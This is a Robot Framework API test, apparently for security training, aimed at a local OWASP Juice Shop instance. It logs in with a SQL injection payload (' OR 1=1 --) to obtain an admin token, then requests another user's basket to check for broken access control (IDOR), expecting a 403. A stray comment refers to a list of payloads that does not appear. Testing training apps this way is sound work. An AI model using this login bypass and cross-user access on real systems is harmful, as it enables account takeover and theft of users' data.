*** Settings ***
Documentation    API Testing: Broken Access Control (IDOR) on Juice Shop
Library          RequestsLibrary
Library          Collections

*** Variables ***
${BASE_URL}      http://localhost:3000

*** Test Cases ***
# Instead of testing just one thing, your robot took a long list of malicious database payloads

Exploit IDOR to Steal Another User's Basket
    [Documentation]    Authenticate via API, then steal Basket #2.
    
    # 1. Establish a connection
    Create Session    juice_shop    ${BASE_URL}
    
    # --- PHASE 1: GET THE WRISTBAND (AUTHENTICATE) ---
    # We use our SQLi trick to quickly log in as the Admin (User #1)
    ${login_payload}=    Create Dictionary    email=' OR 1=1 --    password=fake
    ${login_response}=   POST On Session      juice_shop    /rest/user/login    json=${login_payload}
    
    # Extract the digital wristband (JWT Token) from the server's JSON response
    ${token}=            Set Variable         ${login_response.json()['authentication']['token']}
    
    # --- PHASE 2: THE IDOR HEIST (AUTHORIZATION BYPASS) ---
    # We attach our User #1 token to the request headers
    ${headers}=          Create Dictionary    Authorization=Bearer ${token}
    
    # THE ATTACK: We are logged in as User #1, but we ask for Basket #2!
    ${response}=         GET On Session       juice_shop    /rest/basket/2    headers=${headers}    expected_status=any
    
    # Print the loot to the terminal
    Log To Console       \n=== THE SERVER REPLIED WITH ===
    Log To Console       Status Code: ${response.status_code}
    Log To Console       Response Body: ${response.text}
    
    # A secure server should return 401 (Unauthorized) or 403 (Forbidden)
    Should Be Equal As Integers    ${response.status_code}    403